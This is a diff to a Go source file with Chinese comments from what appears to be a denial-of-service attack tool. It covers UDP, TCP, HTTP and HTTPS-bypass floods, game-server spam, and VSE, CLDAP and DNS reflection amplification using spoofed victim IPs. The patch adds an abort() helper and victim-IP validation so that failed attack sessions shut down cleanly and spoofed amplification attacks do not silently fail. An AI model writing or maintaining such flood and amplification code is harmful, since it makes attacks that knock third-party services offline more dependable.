@@ -339,6 +339,14 @@ func (s *AttackSession) finish() {
 	}
 }
 
+// abort 用于目标无效的早期返回：同时关闭 StopChan（让 trackRates 退出）
+// 与 DoneChan（通知等待方）。若只关 DoneChan 不关 StopChan，
+// trackRates 的每秒 ticker 会永久泄漏。
+func (s *AttackSession) abort() {
+	s.finish()
+	close(s.DoneChan)
+}
+
 func (s *AttackSession) Stop() {
 	s.finish()
 	// 等待攻击 goroutine 退出，但最多 5 秒：
@@ -694,7 +702,7 @@ func StartVSEAttackEx(cfg AttackConfig) *AttackSession {
 	s := NewAttackSession(cfg.Target, cfg.Targets, "vse", newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))
 
 	if cfg.Target == "" && len(cfg.Targets) == 0 {
-		close(s.DoneChan)
+		s.abort()
 		return s
 	}
 
@@ -710,7 +718,7 @@ func StartVSEAttackEx(cfg AttackConfig) *AttackSession {
 
 	addrs := resolveTargets(cfg)
 	if len(addrs) == 0 {
-		close(s.DoneChan)
+		s.abort()
 		return s
 	}
 
@@ -951,7 +959,7 @@ func StartUDPFloodEx(cfg AttackConfig) *AttackSession {
 	s := NewAttackSession(cfg.Target, cfg.Targets, "udp_"+mode, newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))
 
 	if ip == "" && len(cfg.Targets) == 0 {
-		close(s.DoneChan)
+		s.abort()
 		return s
 	}
 
@@ -967,7 +975,7 @@ func StartUDPFloodEx(cfg AttackConfig) *AttackSession {
 
 	addrs := resolveTargets(cfg)
 	if len(addrs) == 0 {
-		close(s.DoneChan)
+		s.abort()
 		return s
 	}
 
@@ -1107,7 +1115,7 @@ func StartTCPFloodEx(cfg AttackConfig) *AttackSession {
 
 	targets := resolveTargetStrings(cfg)
 	if len(targets) == 0 {
-		close(s.DoneChan)
+		s.abort()
 		return s
 	}
 
@@ -1207,7 +1215,7 @@ func StartHTTPFloodEx(cfg AttackConfig) *AttackSession {
 
 	targets := resolveTargetStrings(cfg)
 	if len(targets) == 0 {
-		close(s.DoneChan)
+		s.abort()
 		return s
 	}
 
@@ -1285,7 +1293,7 @@ func StartHTTPSBypassEx(cfg AttackConfig) *AttackSession {
 
 	targets := resolveTargetStrings(cfg)
 	if len(targets) == 0 {
-		close(s.DoneChan)
+		s.abort()
 		return s
 	}
 
@@ -1370,6 +1378,12 @@ func StartGameUDPSpamEx(cfg AttackConfig) *AttackSession {
 	if port == 0 {
 		port = 27015
 	}
+	// 空 target 时 SplitTarget 返回 ip=""，而 ":27015" 会被 ResolveUDPAddr
+	// 解析为 0.0.0.0:27015（本机），必须显式拦截
+	if ip == "" {
+		s.abort()
+		return s
+	}
 
 	prefix := cfg.CustomPrefix
 	if len(prefix) == 0 {
@@ -1378,7 +1392,7 @@ func StartGameUDPSpamEx(cfg AttackConfig) *AttackSession {
 
 	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", ip, port))
 	if err != nil {
-		close(s.DoneChan)
+		s.abort()
 		return s
 	}
 
@@ -1484,7 +1498,7 @@ func StartMinecraftAttackEx(cfg AttackConfig) *AttackSession {
 		targets = []string{net.JoinHostPort(ip, fmt.Sprintf("%d", port))}
 	}
 	if len(targets) == 0 {
-		close(s.DoneChan)
+		s.abort()
 		return s
 	}
 
@@ -1622,6 +1636,12 @@ func StartVSEAmplification(target string, reflectors []string, duration int, thr
 func StartVSEAmplificationEx(cfg AttackConfig) *AttackSession {
 	s := NewAttackSession(cfg.Target, nil, "vse_reflector", newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))
 	victimIP, _ := SplitTarget(cfg.Target)
+	// 伪造源 IP 必须是合法 IPv4 地址（SpoofConn 仅支持 IPv4），
+	// 非法/空目标时直接中止，避免静默无效攻击
+	if net.ParseIP(victimIP) == nil || strings.Contains(victimIP, ":") {
+		s.abort()
+		return s
+	}
 
 	if cfg.PacketSize < 25 {
 		cfg.PacketSize = 25
@@ -1635,7 +1655,7 @@ func StartVSEAmplificationEx(cfg AttackConfig) *AttackSession {
 
 	entries := buildReflectorEntries(cfg.Targets, 27015)
 	if len(entries) == 0 {
-		close(s.DoneChan)
+		s.abort()
 		return s
 	}
 
@@ -2304,6 +2324,10 @@ func StartCLDAPAmplification(target string, reflectors []string, duration int, t
 func StartCLDAPAmplificationEx(cfg AttackConfig) *AttackSession {
 	s := NewAttackSession(cfg.Target, nil, "cldap_reflector", newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))
 	victimIP, _ := SplitTarget(cfg.Target)
+	if net.ParseIP(victimIP) == nil || strings.Contains(victimIP, ":") {
+		s.abort()
+		return s
+	}
 
 	// 请求包必须完整（41 字节 LDAP Search），小于该长度会发送残缺请求
 	if cfg.PacketSize < len(cldapSearchReq) {
@@ -2318,7 +2342,7 @@ func StartCLDAPAmplificationEx(cfg AttackConfig) *AttackSession {
 
 	entries := buildReflectorEntries(cfg.Targets, 389)
 	if len(entries) == 0 {
-		close(s.DoneChan)
+		s.abort()
 		return s
 	}
 
@@ -2442,6 +2466,10 @@ func StartCLDAPAmplificationEx(cfg AttackConfig) *AttackSession {
 func StartDNSAmplificationEx(cfg AttackConfig) *AttackSession {
 	s := NewAttackSession(cfg.Target, nil, "dns_reflector", newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))
 	victimIP, _ := SplitTarget(cfg.Target)
+	if net.ParseIP(victimIP) == nil || strings.Contains(victimIP, ":") {
+		s.abort()
+		return s
+	}
 
 	if cfg.PacketSize < 1 {
 		cfg.PacketSize = 4096
@@ -2455,7 +2483,7 @@ func StartDNSAmplificationEx(cfg AttackConfig) *AttackSession {
 
 	entries := buildReflectorEntries(cfg.Targets, 53)
 	if len(entries) == 0 {
-		close(s.DoneChan)
+		s.abort()
 		return s
 	}
 
